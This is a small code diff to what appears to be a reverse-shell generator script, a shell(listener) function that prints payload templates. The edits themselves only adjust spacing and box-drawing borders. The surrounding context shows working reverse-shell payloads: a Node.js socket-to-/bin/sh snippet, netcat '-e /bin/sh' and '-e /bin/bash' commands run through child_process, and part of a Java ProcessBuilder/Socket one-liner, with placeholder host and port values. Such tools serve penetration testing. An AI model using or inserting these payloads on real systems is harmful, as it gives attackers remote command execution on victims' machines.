@@ -240,7 +240,7 @@ def shell(listener: str):
 ╚═══════════════════════════════════════════════════
 
 ╔NODEJS═════════════════════════════════════════════
-║(function(){
+║ (function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
@@ -255,7 +255,7 @@ def shell(listener: str):
 ╠═══════════════════════════════════════════════════
 ║ require('child_process').exec('nc -e /bin/sh xxx yyy')
 ╠═══════════════════════════════════════════════════
-║var x = global.process.mainModule.require
+║ var x = global.process.mainModule.require
 x('child_process').exec('nc xxx yyy -e /bin/bash')
 ╚═══════════════════════════════════════════════════
 
@@ -404,7 +404,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
         shells.append(
             r"""
 
-╔LUA═════════╦══════════════════════════════════════"""
+╔LUA════════════════╦═══════════════════════════════"""
         )
     shells.append(
         r"""
